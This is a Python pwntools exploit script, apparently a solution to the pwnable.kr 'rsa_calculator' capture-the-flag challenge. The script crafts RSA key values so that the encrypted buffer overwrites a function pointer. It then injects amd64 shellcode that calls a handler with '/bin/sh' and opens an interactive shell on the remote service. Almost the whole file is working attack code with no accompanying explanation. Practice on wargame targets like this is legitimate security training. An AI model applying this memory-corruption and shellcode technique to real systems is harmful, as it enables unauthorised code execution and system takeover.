"""
b *0x00400e9c - after copying the input to the global plaintext buffer
b *0x00400f0d - after stored the encrypted text inside `g_ebuf`
b *0x00400ac5 - before inputting p & q
b *0x00400ad9 - after inputting p
b *0x00400b04 - after inputting q
b *0x00400bce - before calculating N 
b *0x00401408 - calling the handler function in main
0x6020e0 - g_ebuf
0x602500 - func
0x602560 - g_pbuf 
"""


from typing import Tuple
from pwn import *
import numpy as np

context.log_level = 'debug'

MODE = 'debug'
def conn():
    if MODE == 'local':
        return process('./rsa_calculator')
    elif MODE == 'remote':
        return remote('pwnable.kr', 9012)
    elif MODE == 'debug':
        return gdb.debug('./rsa_calculator', execute='''
                        b *0x00401408
                        b *0x00400ad9
                        b *0x00400b04
                        continue
                         ''')


def extended_gcd(a, b):
    """g == a*x + b*y == gcd(a, b)"""
    if a == 0:
        return b, 0, 1
    else:
        g, x, y = extended_gcd(b % a, a)
        return g, y - (b // a) * x, x

def mod_inverse(e, m):
    g, x, _ = extended_gcd(e, m) # e*x + m*y = gcd(e, m)
    if g != 1:
        raise Exception('Modular inverse does not exist')
    else:
        return x % m

def prime_factors(n):
     i = 2
     factors = []
     while i * i <= n:
         if n % i:
             i += 1
         else:
             n //= i
             factors.append(i)
     if n > 1:
         factors.append(n)
     return factors

def get_balanced_products(lst, p=1, q=1) -> Tuple[int, int]:

    if not lst:
        return p, q
    
    increased_p = get_balanced_products(lst[1:], p*lst[0], q)
    increased_q = get_balanced_products(lst[1:], p, q*lst[0])
    if abs(increased_p[0] - increased_p[1]) < abs(increased_q[0] - increased_q[1]):
        return increased_p
    else:
        return increased_q
    

FUNC = 0x602500
G_PBUF = 0x602560
BIN_SH = b'/bin/sh\x00'
SHORT_MAX_POSITIVE_NUMBER = 2**16 - 1

if __name__ == "__main__":
    pipe = conn()
    m = 30
    
    sc = f'mov rdi, {G_PBUF};'
    sc += f'mov rdx, {FUNC + 7*8};'
    sc += 'call rdx;'
    machine_code = asm(sc, arch='amd64', os='linux')
    log.info('shellcode:\n' + disasm(machine_code, arch='amd64', os='linux'))
    
    payload = BIN_SH + machine_code + b'A'* (264 - len(machine_code) - len(BIN_SH)) + chr(m).encode()

    target = G_PBUF + len(BIN_SH)
    e = 5 
    n = m**e - target
    assert n > target
    
    n_prime_factors = prime_factors(n)
    p, q = get_balanced_products(n_prime_factors)
    assert p < SHORT_MAX_POSITIVE_NUMBER and q < SHORT_MAX_POSITIVE_NUMBER
    φ_n = (p - 1)*(q - 1) 
    d = mod_inverse(e, φ_n) 

    log.info('setting key pair values')
    pipe.sendlineafter(b'> ', b'1')
    pipe.sendlineafter(b'p : ', str(p).encode())
    pipe.sendlineafter(b'q : ', str(q).encode())
    pipe.sendlineafter(b'e : ', str(e).encode())
    pipe.sendlineafter(b'd : ', str(d).encode())

    log.info('sending payload')
    pipe.sendlineafter(b'> ', b'2')
    pipe.sendlineafter(b': ', str(len(payload)).encode())
    pipe.sendlineafter(b'paste your plain text data\n', payload)

    pipe.interactive()